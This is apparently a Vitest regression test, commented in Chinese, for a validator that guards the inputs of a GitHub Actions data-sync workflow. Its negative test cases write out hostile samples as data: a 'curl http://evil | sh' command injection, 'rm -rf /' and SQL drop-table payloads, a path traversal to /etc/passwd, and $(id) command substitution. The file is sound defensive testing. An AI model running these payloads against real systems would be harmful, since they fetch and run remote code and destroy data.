// data-sync 输入的判据 + 接线回归闸（专项5 N-1a）。
//
// 两类断言缺一不可：
//   ① 判据本体：正样本过、注入样本拦（含同形态阳性对照）；
//   ② 接线回归：workflow 的 run: 块里不得再出现 ${{ inputs.* }} / ${{ secrets.* }} 直插
//      —— 把校验器删掉或改回直插，这条必红。
import { readFileSync } from 'node:fs'
import { createRequire } from 'node:module'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'

import { describe, expect, it } from 'vitest'

const require = createRequire(import.meta.url)
const { validateInputs, DEFAULT_ASSET_PREFIX } = require('../scripts/check-data-sync-inputs.cjs')
const repoRoot = join(dirname(fileURLToPath(import.meta.url)), '..')
const workflowPath = join(repoRoot, '.github', 'workflows', 'data-sync.yml')

const good = {
  assetUrl: DEFAULT_ASSET_PREFIX + 'v1/suitability_cells-142477.dump',
  table: 'suitability_cells',
  fileName: 'sync.dump',
}

describe('data-sync 输入校验', () => {
  it('正样本（阳性对照）：文档示例的形状必须通过', () => {
    expect(validateInputs(good)).toEqual({ ok: true, errors: [] })
  })

  it('缺省 file_name 落到 sync.dump', () => {
    expect(validateInputs({ assetUrl: good.assetUrl, table: 'canal' }).ok).toBe(true)
  })

  const badCases = [
    [
      'URL 命令注入（原先直插 run: 的形态）',
      { ...good, assetUrl: good.assetUrl + '"; curl http://evil | sh ; "' },
    ],
    ['URL 换域名', { ...good, assetUrl: 'https://evil.example.com/x.dump' }],
    ['URL 带首尾空白', { ...good, assetUrl: ' ' + good.assetUrl }],
    ['table SQL 注入', { ...good, table: "canal'; drop table roads; --" }],
    ['table 命令拼接', { ...good, table: 'canal;rm -rf /' }],
    ['table 大写与横线', { ...good, table: 'Canal-Lines' }],
    ['file_name 路径穿越', { ...good, fileName: '../../etc/passwd' }],
    ['file_name 命令替换', { ...good, fileName: '$(id).dump' }],
    ['file_name 反引号', { ...good, fileName: 'a`id`.dump' }],
  ]

  it.each(badCases)('负样本必须被拦：%s', (_name, input) => {
    const res = validateInputs(input)
    expect(res.ok).toBe(false)
    expect(res.errors.length).toBeGreaterThan(0)
  })
})

describe('workflow 接线回归闸', () => {
  const yaml = readFileSync(workflowPath, 'utf8')
  const steps = yaml.split('- name:')

  it('run: 块里不得出现 ${{ inputs.* }} / ${{ secrets.* }} 直插', () => {
    const runBlocks = steps
      .filter((s) => /run:\s*[|>]/.test(s))
      .map((s) => s.slice(s.indexOf('run:')))
    expect(runBlocks.length).toBeGreaterThan(0)
    for (const s of runBlocks) {
      expect(s.includes('${{ inputs.')).toBe(false)
      expect(s.includes('${{ secrets.')).toBe(false)
    }
  })

  it('校验步必须在下载之前，且三个输入经 env 传入', () => {
    const vIdx = yaml.indexOf('check-data-sync-inputs.cjs')
    const dIdx = yaml.indexOf('Download asset')
    expect(vIdx).toBeGreaterThan(-1)
    expect(dIdx).toBeGreaterThan(-1)
    expect(vIdx).toBeLessThan(dIdx)
    for (const key of ['ASSET_URL:', 'TABLE:', 'FILE_NAME:']) {
      expect(yaml).toContain(key)
    }
  })
})
